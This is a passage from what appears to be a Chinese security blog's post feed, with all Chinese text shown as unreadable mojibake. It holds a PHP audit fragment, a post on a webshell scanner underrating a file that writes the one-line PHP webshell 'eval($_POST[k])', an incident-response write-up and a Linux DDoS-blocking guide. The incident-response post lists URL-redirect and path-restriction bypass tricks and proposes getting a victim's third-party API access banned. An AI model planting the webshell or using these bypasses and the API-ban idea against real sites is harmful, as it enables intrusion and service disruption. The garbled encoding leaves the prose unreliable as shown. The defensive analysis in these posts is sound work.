<h1 id="0x08-éªŒè¯ç "><a href="#0x08-éªŒè¯ç " class="headerlink" title="0x08 éªŒè¯ç "></a>0x08 éªŒè¯ç </h1><p>éªŒè¯ç ä¸»è¦ä¼šå‡ºç°ä¸€äº›é€»è¾‘æ¼æ´ï¼Œæœ€å¸¸è§çš„æœ‰ä¸¤ç§ï¼š</p>
<ol>
<li>éªŒè¯è¿‡ç¨‹åˆ†ä¸¤æ­¥ï¼Œå…ˆéªŒè¯éªŒè¯ç æ˜¯å¦æ­£ç¡®ï¼Œæ­£ç¡®åˆ™è¿›è¡Œä¸‹ä¸€æ­¥</li>
<li>éªŒè¯ç æ²¡æœ‰è®¾ç½®æœ‰æ•ˆæ—¶é—´ï¼Œå¯¼è‡´å¯ä»¥é‡å¤ä½¿ç”¨</li>
</ol>
<p><strong>å‚è€ƒé“¾æ¥ï¼š</strong><br><a href="http://www.jb51.net/article/56612.htm" target="_blank" rel="external">http://www.jb51.net/article/56612.htm</a><br><a href="http://www.freebuf.com/author/lonehand" target="_blank" rel="external">http://www.freebuf.com/author/lonehand</a><br><a href="http://www.cnblogs.com/Hyber/p/6133196.html" target="_blank" rel="external">http://www.cnblogs.com/Hyber/p/6133196.html</a><br><a href="http://www.am0s.com/functions/227.html" target="_blank" rel="external">http://www.am0s.com/functions/227.html</a></p>
]]></content>
      
        
        <tags>
            
            <tag> ç¼–ç¨‹ </tag>
            
            <tag> PHP </tag>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> å®‰å…¨å¼€å‘ </tag>
            
            <tag> DVWA </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[è®°Dç›¾_WebæŸ¥æ€ä¸­çš„ä¸€ä¸ªBug]]></title>
      <url>/2017/07/07/%E8%AE%B0D%E7%9B%BE-Web%E6%9F%A5%E6%9D%80%E4%B8%AD%E7%9A%84%E4%B8%80%E4%B8%AABug/</url>
      <content type="html"><![CDATA[<p>å…¬å¸æœ€è¿‘çš„æ¥çš„é¡¹ç›®ï¼Œéœ€è¦å¯¹40000ä¸ªwebshellæ ·æœ¬åˆ†æï¼Œç”±äºæ—¶é—´ç´§ï¼Œä¹Ÿæ²¡å†™ä¸œè¥¿ï¼Œå…ˆæ‹¿Dç›¾å‡‘åˆç€ç”¨ä¸€æ¬¡å§ï¼Œè®°ä½¿ç”¨è¿‡ç¨‹ä¸­é‡åˆ°çš„ä¸€ä¸ªbugã€‚<br><a id="more"></a><br><img src="http://oa8y5guqs.bkt.clouddn.com/D%E7%9B%BE-1.png" alt=""><br>å¤§å®¶çœ‹è¿™ä¸ªå›¾ç‰‡</p>
<p>Dç›¾æŠ¥çš„ç­‰çº§æ‰æ˜¯â€œ1â€ï¼Œæˆ‘ä»¬çœ‹ä¸‹<code>file_put_contents</code>å‡½æ•°ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">file_put_contents(file,data,mode,context)</div><div class="line">file    å¿…éœ€ã€‚è§„å®šè¦å†™å…¥æ•°æ®çš„æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶ã€‚</div><div class="line">data    å¯é€‰ã€‚è§„å®šè¦å†™å…¥æ–‡ä»¶çš„æ•°æ®ã€‚å¯ä»¥æ˜¯å­—ç¬¦ä¸²ã€æ•°ç»„æˆ–æ•°æ®æµã€‚</div><div class="line">mode    å¯é€‰ã€‚è§„å®šå¦‚ä½•æ‰“å¼€/å†™å…¥æ–‡ä»¶ã€‚å¯èƒ½çš„å€¼ï¼š</div><div class="line">        FILE_USE_INCLUDE_PATH</div><div class="line">        FILE_APPEND</div><div class="line">        LOCK_EX</div><div class="line">context</div><div class="line">        å¯é€‰ã€‚è§„å®šæ–‡ä»¶å¥æŸ„çš„ç¯å¢ƒã€‚</div><div class="line">        context æ˜¯ä¸€å¥—å¯ä»¥ä¿®æ”¹æµçš„è¡Œä¸ºçš„é€‰é¡¹ã€‚è‹¥ä½¿ç”¨ nullï¼Œåˆ™å¿½ç•¥ã€‚</div></pre></td></tr></table></figure></p>
<p>å¾ˆæ˜æ˜¾ï¼Œè¿™ä¸ªæ–‡ä»¶çš„åå­—è¦çœ‹åç«¯æ€ä¹ˆå¤„ç†ï¼Œå¦‚æœæ˜¯æ¥æ”¶<code>POST</code>å‚æ•°ä¸­çš„â€œKâ€ï¼Œé‚£å°±æ˜¯è‡ªå®šä¹‰æ–‡ä»¶åäº†ï¼Œå°±æ˜¯ä¸æ˜¯ï¼Œè‚¯å®šä¹Ÿæ˜¯ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶è€Œæ–‡ä»¶å†…å®¹å°±æ˜¯<code>&lt;?php eval($_POST[k]);?&gt;</code>ã€‚</p>
<p>è¿™ç§å¾ˆæ˜æ˜¾ä¸æ˜¯æ­£å¸¸æ“ä½œå•Šï¼Œä½†æ˜¯Dç›¾ç«Ÿç„¶æŠ¥ç­‰çº§ä¸ºâ€œ1â€ï¼æˆ‘ä»¬ä½¿ç”¨çš„æ—¶å€™  æœ‰æ—¶å€™ä¼šç»å¸¸å¿½ç•¥ç­‰çº§â€œ3â€ä»¥ä¸‹çš„æ–‡ä»¶ï¼Œè¿™å°±å¾ˆå±é™©å•Šã€‚</p>
<p>æˆ‘çŒœæµ‹ï¼šå¯èƒ½æ˜¯ç”±äºDç›¾çš„ç­–ç•¥æ˜¯åªè¦åœ¨ä»–çš„è§„åˆ™é‡Œå‡ºç°ï¼Œå°±æ˜¾ç¤ºå‡ºæ¥å‡ºç°çš„ç¬¬ä¸€æ¡çš„é‚£ä¸ªç­‰çº§ã€‚è¿™æ˜æ˜¾ä¸ç¬¦åˆå¸¸ç†å•Šï¼</p>
<p>æœ€èµ·ç è¦åšä¸ªå…¨æ–‡æ£€æµ‹ï¼Œç„¶åæŠŠæœ€é«˜ç­‰çº§çš„ç»™æ˜¾ç¤ºå‡ºæ¥ï¼Œè¿™æ ·ï¼Œç”¨æˆ·å†äººå·¥æ’æŸ¥ï¼Œå°±ä¸ä¼šå‡ºç°æ¼æŠ¥çš„æƒ…å†µäº†ã€‚ï¼ˆç»•çš„å’±å°±æš‚ä¸”ä¸è¯´ï¼‰</p>
]]></content>
      
        
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> webshell </tag>
            
            <tag> åº”æ€¥å“åº” </tag>
            
            <tag> Dç›¾ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[è®°ä¸€æ¬¡å¥‡è‘©çš„åº”æ€¥å“åº”]]></title>
      <url>/2017/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A5%87%E8%91%A9%E7%9A%84%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
      <content type="html"><![CDATA[<p>ä¸Šä¸Šä¸Šå‘¨æœ«çœŸæ˜¯ä¸ªä¸å¹³å‡¡çš„å‘¨æœ«ï¼Œå‘¨å…­å…¬å¸ä¸¾åŠâ€œè„‰ææ¶ŒåŠ¨â€æ²™é¾™ï¼Œè™½ç„¶å¿™ç‚¹ï¼Œä½†æ˜¯ä¹Ÿæ˜¯å­¦åˆ°å¾ˆå¤šï¼Œå†µä¸”è¿˜æ˜¯è‡ªå·±ç¬¬ä¸€æ¬¡å‚åŠ å®‰å…¨ç›¸å…³çš„ä¼šè®®ã€‚ç„¶åå‘¨æœ«ä¸Šåˆèµ¶å¿™å®Œæˆå››çˆ·å®‰æ’çš„å®‰å…¨è„‰æä¸Šçš„ä»»åŠ¡ï¼Œå†™äº†ä¸ªæ–‡ç« å‘åˆ°â€œå®‰å…¨è„‰æâ€ä¸Šã€‚ä¸‹åˆåˆšè¦å‡ºå»åƒé¥­ï¼Œå·¥ä½œæ¥äº†ã€‚ã€‚ã€‚<br><a id="more"></a><br>å…ˆè¯´ä¸‹è‡ªå·±åœ¨æ²™é¾™ä¸Šå­¦åˆ°çš„</p>
<ol>
<li>URLè·³è½¬çš„æ—¶å€™å¯ä»¥ç”¨<code>\@</code>ç»•è¿‡ï¼Œ<code>\</code>æ˜¯åˆ©ç”¨æµè§ˆå™¨å’Œåç«¯è§£æå·®å¼‚ï¼Œ<code>@</code>è¿™ä¸ªä¹‹å‰åœ¨ssrfä¸Šç»•è¿‡ç”¨</li>
<li><code>/%0a/</code>è¿™ç§å½¢å¼å¯ç»•è¿‡ä¸€äº›ç›®å½•é™åˆ¶ä»¥ä¾¿è¿›è¡Œå…¶ä»–æ“ä½œï¼Œä¹‹å‰éƒ½ç”¨åˆ°crlfï¼Œwafç­‰ä¸Š</li>
<li>æœç´¢æ•æ„Ÿä¿¡æ¯å¬è¯´bingæ›´å¼ºå¤§ï¼Œå°ä¼™ä¼´è¿˜ç»™æˆ‘æ¨èäº†<a href="https://duckduckgo.com/" target="_blank" rel="external">DuckDuckGo</a></li>
</ol>
<p>æ€»ç»“èµ·æ¥å°±æ˜¯ï¼šå¤ªå¹´è½»ï¼Œå¹´è½»ï¼Œè½»ã€‚ã€‚ã€‚[æ‚è„¸][æ‚è„¸][æ‚è„¸]</p>
<p>å¥½äº†ï¼Œè¯´ä¸‹è¿™æ¬¡çš„åº”æ€¥å“åº”åŠè‡ªå·±çš„æ€è€ƒã€‚æ„Ÿè°¢åŠ è²çŒ«ã€å››çˆ·å¸¦æˆ‘ï¼Œè·ªæ‹œå•Šï¼</p>
<h1 id="0x00-äº‹ä»¶æè¿°"><a href="#0x00-äº‹ä»¶æè¿°" class="headerlink" title="0x00 äº‹ä»¶æè¿°"></a>0x00 äº‹ä»¶æè¿°</h1><p>å®¢æˆ·åé¦ˆä»6æœˆ23æ—¥å¼€å§‹ï¼Œç½‘ç«™è®¿é—®å»¶è¿Ÿå¾ˆå¤§ï¼Œé‡å¯æœåŠ¡ä¹‹åä¼šè¶Šæ¥è¶Šæ…¢ï¼Œç›´è‡³502ã€‚ç½‘ç«™ä½¿ç”¨LNMPé›†æˆç¯å¢ƒï¼ŒæœåŠ¡å™¨åŠæ•°æ®åº“ä¸æ˜¯å¼±å£ä»¤ã€‚6æœˆ25å·å®¢æˆ·ä¹°äº†ç›¸å…³å®‰å…¨äº§å“ï¼Œæœªå‘ç°æ˜æ˜¾çš„æ¶æ„æ”»å‡»è¡Œä¸ºï¼ŒåŒæ—¶æœåŠ¡å™¨æ€§èƒ½è‰¯å¥½ã€‚</p>
<h1 id="0x01-äº‹ä»¶å¤„ç†è¿‡ç¨‹"><a href="#0x01-äº‹ä»¶å¤„ç†è¿‡ç¨‹" class="headerlink" title="0x01 äº‹ä»¶å¤„ç†è¿‡ç¨‹"></a>0x01 äº‹ä»¶å¤„ç†è¿‡ç¨‹</h1><p>é¦–å…ˆæˆ‘çš„ç¬¬ä¸€ååº”æ˜¯è¢«Däº†ï¼Œä½¿ç”¨topå‘ç°æœåŠ¡å™¨æ€§èƒ½æ­£å¸¸ã€‚</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/25_1.png" alt=""></p>
<p>ç„¶åå®¢æˆ·ä¹Ÿä¹°äº†äº§å“ï¼Œäº§å“ä¸Šä¹Ÿæœªå‡ºç°å¼‚å¸¸ã€‚</p>
<p>ç„¶åä½¿ç”¨äº†ä¸‹è‡ªå·±åšçš„ä¿¡æ¯æ”¶é›†çš„<a href="">linux_ä¿¡æ¯æ”¶é›†.sh</a>ï¼Œæœé›†äº†ä¸‹ç›¸å…³ä¿¡æ¯ï¼ŒæŸ¥çœ‹ä¹Ÿå¹¶æ²¡å‘ç°ä»€ä¹ˆå¼‚å¸¸ã€‚</p>
<p>ä½¿ç”¨äº†Pythonç‰ˆçš„webshellæŸ¥æ€ï¼Œä¹ŸTMæ²¡å‘ç°å•¥ï¼Œå„ç§çœ‹æ—¥å¿—ä¹Ÿå¹¶æ²¡å‘ç°ä»€ä¹ˆåµç”¨ï¼Œè¿™TMæˆ‘å°±å´©æºƒäº†ã€‚ã€‚ã€‚</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/25_2.jpg" alt=""></p>
<p>ç„¶åæˆ‘åˆè€ƒè™‘æ˜¯ä¸æ˜¯Slow HTTP DDosï¼Œä½†æ˜¯æ²¡åŠæ³•éªŒè¯å•Šã€‚</p>
<p>æœ¬åœ°å¤ç°çš„è¯å®¢æˆ·è‚¯å®šä¸è®©å•Šï¼Œæ— åŠ©å•Šã€‚ã€‚ã€‚</p>
<p>æ²¡åŠæ³•åªèƒ½ç»§ç»­åˆ†æï¼Œç„¶åäº‹ä»¶å‡ºç°äº†è½¬æœºï¼š</p>
<p>æœåŠ¡ä¼šå‘ˆç°ä¸¤ç§æƒ…å†µï¼š</p>
<p>httpèµ„æºæœªè¢«å å°½çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥è®¿é—®é™æ€èµ„æºä»¥åŠç›´æ¥æŸ¥sqlçš„è·¯ç”±é“¾æ¥ï¼Œå¦‚ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://xxx/wap/test.css?v=1</div><div class="line">http://xxx/phpmyadmin/index.php</div></pre></td></tr></table></figure></p>
<p>httpèµ„æºå®Œå…¨è¢«å æ»¡ï¼Œå¯¼è‡´é™æ€èµ„æºéƒ½ä¸èƒ½è®¿é—®ï¼ŒæŸ¥è¯¢è¿›ç¨‹ä¼šå‘ç°æœ€å¤§50ä¸ªhttpdè¿›ç¨‹å…¨å¯åŠ¨äº†ã€‚</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/25_3.png" alt=""></p>
<p>ç”±äºæœ€å¤§åªå…è®¸50ä¸ªè¿›ç¨‹ï¼Œæ‰€ä»¥å¯¼è‡´è¿™ä¸ªæ—¶å€™é™æ€å’ŒåŠ¨æ€çš„èµ„æºéƒ½æ— æ³•è¿›è¡Œè®¿é—®äº†ã€‚<br>æ£€æŸ¥nginxæ—¥å¿—ï¼Œlogä¸­æœ‰å¤§é‡çš„499çŠ¶æ€ç ï¼Œè¿™ä¸ªæ˜¯ç”±äºå®¢æˆ·ç«¯ç­‰å¾…è¶…æ—¶ï¼Œå…³é—­äº†é“¾æ¥å¯¼è‡´ã€‚</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/25_4.png" alt=""></p>
<p>æš‚ä¸”åœ¨<code>proxy.conf</code>ä¸­æ–°å¢äº†<code>proxy_ignore_client_abort on;</code></p>
<p>é‡å¯åï¼Œä¸åœ¨æœ‰å®¢æˆ·ç«¯ä¸»åŠ¨å…³é—­é“¾æ¥çš„æƒ…å†µã€‚</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/25_5.png" alt=""></p>
<p>æ£€æŸ¥éƒ¨åˆ†é“¾æ¥æºä»£ç å‡½æ•°ï¼Œå¦‚åœ¨èµ„æºæœªå æ»¡æƒ…å†µä¸‹ï¼Œè®¿é—®æ­¤phpmyadmin/index.phpè¯·æ±‚æ˜¯æ²¡é—®é¢˜çš„ï¼š</p>
<blockquote>
<p><a href="http://xxx/xxx/ajax.php" target="_blank" rel="external">http://xxx/xxx/ajax.php</a></p>
</blockquote>
<p>å®šä½åˆ°<code>/data/wwwroot/xxx/ajax.action.php</code>æ–‡ä»¶ï¼ŒæŸ¥çœ‹åå‘ç°å°±æ˜¯ä¸€ä¸ªç®€å•çš„sqlæŸ¥è¯¢ï¼Œç„¶åæ‰“å°äº†jsonã€‚<br><img src="http://oa8y5guqs.bkt.clouddn.com/25_6.png" alt=""></p>
<p>ç„¶åè®¿é—® â€œæ‰¾å›å¯†ç é“¾æ¥â€ æ¯æ¬¡å»¶è¿Ÿæ—¶é—´éƒ½åœ¨28.19ç§’å·¦å³ï¼Œå¦‚ä¸‹ï¼š</p>
<blockquote>
<p><a href="http://xxx/finduser/findpassword" target="_blank" rel="external">http://xxx/finduser/findpassword</a></p>
</blockquote>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/25_7.png" alt=""></p>
<p>äºæ˜¯å®šä½åˆ°è¯¥æ–¹æ³•çš„æºä»£ç å‡½æ•°ä½ç½®ï¼Œåœ¨æ¸²æŸ“æ¨¡ç‰ˆå‰ï¼Œå°è¯•<code>die(&#39;111111&#39;);</code>å‘ç°å¾ˆå¿«èƒ½æ˜¾ç¤º111111</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">vi ./xxx/finduser.action.php</div><div class="line"></div><div class="line">$title = &quot;æ‰¾å›å¯†ç &quot;;</div><div class="line">die(&apos;1111111&apos;);</div><div class="line">include templates(&quot;mobile/user&quot;, &quot;findpassword&quot;);</div></pre></td></tr></table></figure>
<p>è¿™è¯´æ˜æ¨¡ç‰ˆåœ¨æ¸²æŸ“å‰æ˜¯æ²¡æœ‰é—®é¢˜çš„ã€‚</p>
<p>ä¸Šè¾¹ä¸¤æ­¥ä¹Ÿå°±è¯´æ˜äº†ï¼š</p>
<ol>
<li>ä¸ä¼šæ˜¯æ”»å‡»çš„é€ æˆçš„ã€‚</li>
<li>sqlæŸ¥è¯¢æ²¡é—®é¢˜ã€‚</li>
</ol>
<p>ä¹‹åçŒœæµ‹ä¸¤ç§æƒ…å†µï¼š</p>
<ol>
<li>å¯èƒ½æ˜¯ç¼“å­˜è¶…æ—¶</li>
<li>ä¹Ÿå¯èƒ½æ˜¯è¿æ¥æŸä¸ªç¬¬ä¸‰æ–¹æ¥å£è¶…æ—¶å‡ºç°çš„é—®é¢˜</li>
</ol>
<p>é‡æ–°åˆ·æ–°é¡µé¢ï¼Œå¹¶åŒæ—¶æŸ¥çœ‹ç«¯å£<code>syn_send</code>æƒ…å†µï¼Œæœç„¶å‘ç°äº†é—®é¢˜ï¼š</p>
<p><code>netstat -anp|grep -i syn_sent|awk &#39;{print $5}&#39;|sort|uniq</code></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/25_9.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">140.207.119.12:443</div><div class="line">58.246.220.31:443</div></pre></td></tr></table></figure>
<p>æ¯è®¿é—®åŠ è½½æ…¢çš„é¡µé¢ï¼Œå°±ä¼šå¤šä¸€ä¸ªè¿™ä¸ªipçš„é“¾æ¥å‡ºæ¥ã€‚<br>æµè§ˆå™¨è®¿é—®åï¼Œå‘ç°sslæ ‡è¯†æ˜¯å¾®ä¿¡çš„æ¥å£ã€‚</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/25_10.png" alt=""></p>
<p>api.weixin.qq.com -&gt;  58.246.220.31<br>ä¸Šè¾¹è¿™ä¸ªåœ¨æœåŠ¡å™¨ä¸Šæ˜¯pingä¸é€šçš„ã€‚æŸ¥çœ‹äº†ä¸‹æœåŠ¡å™¨ä¸Šè°ƒç”¨è¯¥apiçš„æ–‡ä»¶ã€‚</p>
<p><code>find ./ -type f -name &quot;*.php&quot;|xargs grep &quot;api.weixin.qq.com&quot;</code></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/25_11.png" alt=""></p>
<p>æ³¨é‡Šæ‰/xxx/jssdk.class.phpç­‰é¡µé¢ä¸­çš„api.weixin.qq.comè®¿é—®ä¸åœ¨æ…¢äº†ã€‚</p>
<p>è‡³æ­¤ï¼Œäº‹ä»¶é—®é¢˜å®šä½æˆåŠŸã€‚</p>
<h1 id="0x02-å®‰å…¨å»ºè®®"><a href="#0x02-å®‰å…¨å»ºè®®" class="headerlink" title="0x02 å®‰å…¨å»ºè®®"></a>0x02 å®‰å…¨å»ºè®®</h1><ol>
<li>æœ€ç®€å•çš„ï¼Œä¿®æ”¹<code>/etc/hosts</code>ã€‚</li>
<li>å’Œå¾®ä¿¡æ–¹å–å¾—è”ç³»ï¼Œè§£å°å¯¹api.weixin.qq.comçš„ipé™åˆ¶ã€‚</li>
<li>å®šä½æ‰€æœ‰è°ƒç”¨çš„apiæ¥å£ï¼Œçœ‹çœ‹è¿˜æœ‰å“ªäº›åœ¨æœåŠ¡å™¨ä¸Šæ˜¯ä¸èƒ½è®¿é—®çš„ï¼Œå¹¶è¿›è¡Œæ›¿æ¢ã€‚</li>
</ol>
<h1 id="0x03-äº‹ä»¶æ€è€ƒ"><a href="#0x03-äº‹ä»¶æ€è€ƒ" class="headerlink" title="0x03 äº‹ä»¶æ€è€ƒ"></a>0x03 äº‹ä»¶æ€è€ƒ</h1><p>äº‹åæˆ‘ä»¬å’Œå®¢æˆ·äº¤æµï¼Œå®¢æˆ·åé¦ˆï¼šç”±äºä¸å¯æè¿°çš„åŸå› ï¼Œå¯èƒ½ç”¨æˆ·ä¸¾æŠ¥äº†ä»–ä»¬ï¼Œæ‰€ä»¥å¯èƒ½æ˜¯è¿™æ ·å¯¼è‡´ä»–ä»¬å¾®ä¿¡APIè¢«å°ã€‚</p>
<p>äº‹åæƒ³äº†æƒ³ï¼Œè¿™TMæ€è·¯çœŸæ˜¯çŒ¥çå•Šï¼ï¼ï¼</p>
<p>ç„¶åè”æƒ³åˆ°ä¹‹å‰çŒªçŒªä¾ å°å¯†åœˆè¯´çš„</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/25_12.png" alt=""></p>
<p>æ‰€ä»¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ç‚¹ï¼Œæ¯”å¦‚ç³»ç»Ÿéœ€è¦è¯·æ±‚ç¬¬ä¸‰æ–¹APIï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥æ„é€ æ¶æ„payloadè®©æœåŠ¡å™¨å‘é€æ¶æ„çš„åŒ…æˆ–è€…é¢‘ç¹è¯·æ±‚ç›¸å…³APIï¼Œé‚£ä¹ˆæ­¤æ¥å£å°±ä¼šè¢«å°æ‰ï¼Œé‚£ä¹ˆä¸šåŠ¡å°±å´©äº†ï¼</p>
]]></content>
      
        
        <tags>
            
            <tag> è¿ç»´ </tag>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> linux </tag>
            
            <tag> åº”æ€¥å“åº” </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[linuxä¸‹DDosæ”»å‡»å¤„ç†æ–¹æ³•]]></title>
      <url>/2017/06/18/linux%E4%B8%8BDDos%E6%94%BB%E5%87%BB%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95/</url>
      <content type="html"><![CDATA[<p>å½“æˆ‘ä»¬çš„ Linux æœåŠ¡å™¨å—åˆ°å°‘é‡æ”»å‡»æ—¶ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ iptables æ¥æ‰‹åŠ¨å°ç¦è¿™äº›æ”»å‡»è€…çš„IPã€‚</p>
<p>å¦‚æœæ”»å‡»æ¯”è¾ƒå¤§æ—¶ï¼Œæœ‰æ—¶æˆ‘ä»¬æ ¹æœ¬æ— æ³•å“åº”è¿‡æ¥ï¼Œiptables åŸºæœ¬ä¹Ÿå°±æ— èƒ½ä¸ºåŠ›äº†ã€‚</p>
<p>å¯¹äºå°‘é‡æ”»å‡»å¤„ç†çš„æ­¥éª¤åº”è¯¥æ˜¯ï¼šè·å–IP â€“&gt; å°IP</p>
<h1 id="1ã€è·å–æ”»å‡»è€…-IP"><a href="#1ã€è·å–æ”»å‡»è€…-IP" class="headerlink" title="1ã€è·å–æ”»å‡»è€… IP"></a>1ã€è·å–æ”»å‡»è€… IP</h1><h2 id="1-1-é€šè¿‡-netstat-è·å–"><a href="#1-1-é€šè¿‡-netstat-è·å–" class="headerlink" title="1.1 é€šè¿‡ netstat è·å–"></a>1.1 é€šè¿‡ netstat è·å–</h2><p>å¦‚æœæ”»å‡»è€…æ”»å‡»çš„æ˜¯ä½ çš„ Web æœåŠ¡çš„è¯ï¼Œé»˜è®¤æ˜¯80ç«¯å£ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„ä»£ç ï¼</p>
<p>å¦‚æœæ”»å‡»çš„ä¸æ˜¯80ç«¯å£çš„è¯ï¼Œå°†ä¸‹é¢çš„ä¸¤ä¸ªæ•°å­—80æ”¹ä¸ºä½ è¢«æ”»å‡»çš„ç«¯å£å³å¯ï¼</p>
<p>å¦‚æœä½ éœ€è¦æ˜¾ç¤ºå¤šæ¡è®°å½•ï¼Œè¯·è‡ªå·±æ‰‹åŠ¨å°† head -n20 è°ƒå¤§å³å¯<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netstat -anlp|grep 80|grep tcp|awk &apos;&#123;print $5&#125;&apos;|awk -F: &apos;&#123;print $1&#125;&apos;|sort|uniq -c|sort -nr|head -n20 | netstat -ant |awk &apos;/:80/&#123;split($5,ip,&quot;:&quot;);++A[ip[1]]&#125;END&#123;for(i in A) print A[i],i&#125;&apos; |sort -rn|head -n20</div></pre></td></tr></table></figure></p>
<h2 id="1-2-é€šè¿‡-tcpdump-è·å–"><a href="#1-2-é€šè¿‡-tcpdump-è·å–" class="headerlink" title="1.2 é€šè¿‡ tcpdump è·å–"></a>1.2 é€šè¿‡ tcpdump è·å–</h2><p>åœ¨ä½¿ç”¨ä¹‹å‰ï¼Œè¯·ç¡®ä¿æ‚¨çš„ç³»ç»Ÿå·²ç»å®‰è£…äº† tcpdump ã€‚</p>
<p>Debian / Ubuntu ç³»åˆ—å¿«é€Ÿå®‰è£…å¦‚ä¸‹</p>
<blockquote>
<p>apt-get install -y tcpdump</p>
</blockquote>
<p>å®‰è£…åï¼Œä½¿ç”¨ä¸‹é¢çš„ä»£ç å³å¯ã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ -i eth0 æŒ‡çš„æ˜¯ä½ ä¸»ç½‘å¡ï¼Œå¦‚æœä½ æ˜¯ OpenVZ çš„è™šæ‹Ÿæœºçš„è¯ï¼Œå°±æ”¹æˆæ‚¨çš„ç½‘å¡åvenet0</p>
<p>åŒæ ·ä½ éœ€è¦è®¾ç½®çš„æ˜¯ï¼Œ port 80 è®¾ç½®ä½ è¢«æ”»å‡»çš„ç«¯å£ï¼Œ -c 1000 æŒ‡ tcpdump éœ€è¦ç»Ÿè®¡çš„è®°å½•æ•°ï¼Œä»–ä¼šåœ¨è¾¾åˆ°è¿™ä¸ªæ•°ä¹‹åæ˜¾ç¤ºç»“æœã€‚ head -20 è®¾ç½®ä½ è¦æ˜¾ç¤ºçš„è®°å½•æ¡æ•°<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcpdump -i eth0 -tnn dst port 80 -c 1000 | awk -F&quot;.&quot; &apos;&#123;print $1&quot;.&quot;$2&quot;.&quot;$3&quot;.&quot;$4&#125;&apos; | sort | uniq -c | sort -nr |head -20</div></pre></td></tr></table></figure></p>
<h1 id="2ã€å°ç¦-IP"><a href="#2ã€å°ç¦-IP" class="headerlink" title="2ã€å°ç¦ IP"></a>2ã€å°ç¦ IP</h1><p>é€šè¿‡ä¸Šé¢çš„æ­¥éª¤ï¼Œæˆ‘ä»¬å·²ç»çŸ¥é“æ˜¯è°åœ¨æ”»å‡»æˆ‘ä»¬äº†ï¼Œç°åœ¨æˆ‘ä»¬å°±å¯ä»¥å°†ä»–ä»¬æ‹‰å…¥ iptables ç¦æ­¢ä»–ä»¬è¿æ¥åˆ°æœåŠ¡å™¨äº†ã€‚</p>
<h2 id="2-1-å°ç¦å•ä¸ª-IP"><a href="#2-1-å°ç¦å•ä¸ª-IP" class="headerlink" title="2.1 å°ç¦å•ä¸ª IP"></a>2.1 å°ç¦å•ä¸ª IP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iptables -I INPUT -s 211.1.2.1 -j DROP</div></pre></td></tr></table></figure>
<h2 id="2-2-å°ç¦ä¸€ä¸ª-IP-æ®µ"><a href="#2-2-å°ç¦ä¸€ä¸ª-IP-æ®µ" class="headerlink" title="2.2 å°ç¦ä¸€ä¸ª IP æ®µ"></a>2.2 å°ç¦ä¸€ä¸ª IP æ®µ</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iptables -I INPUT -s 211.1.2.0/16 -j DROP</div></pre></td></tr></table></figure>
<p>å¦‚æœéœ€è¦æ›´å¤šå…³äº iptables çš„æ•™ç¨‹ï¼Œç”±äºä¸åœ¨æœ¬å¸–éœ€è¦è®²è¿°çš„å†…å®¹å½“ä¸­ï¼Œè¯·è‡ªè¡Œ Google ç­”æ¡ˆã€‚</p>
<p>æ¥æºï¼š(<a href="https://imlonghao.com/8.html)[https://imlonghao.com/8.html" target="_blank" rel="external">https://imlonghao.com/8.html)[https://imlonghao.com/8.html</a>]</p>
]]></content>
      
        
        <tags>
            
            <tag> è¿ç»´ </tag>
            
            <tag> tcpdump </tag>
            
            <tag> iptables </tag>
            
            <tag> linux </tag>
            
            <tag> åº”æ€¥å“åº” </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[æ¸—é€æµ‹è¯•å°æŠ€å·§ä¹‹è¿‡wafæœ¨é©¬]]></title>
